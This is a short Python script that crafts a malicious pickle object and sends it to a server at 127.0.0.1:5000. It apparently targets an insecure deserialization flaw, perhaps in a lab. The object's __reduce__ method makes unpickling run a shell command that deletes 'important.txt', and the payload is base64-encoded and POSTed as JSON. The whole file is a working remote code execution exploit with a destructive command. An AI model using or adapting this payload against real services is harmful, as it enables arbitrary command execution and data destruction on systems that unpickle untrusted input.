import json
import subprocess
import pickle
import requests
import base64


class DeleteImportant:
    def __reduce__(self):
        return (subprocess.Popen, (("rm", "important.txt",),))


data = pickle.dumps(DeleteImportant())

string_data = str(base64.b64encode(data))
string_data = string_data.strip("b").strip("'")

requests.post("http://127.0.0.1:5000/", json={"data": string_data})
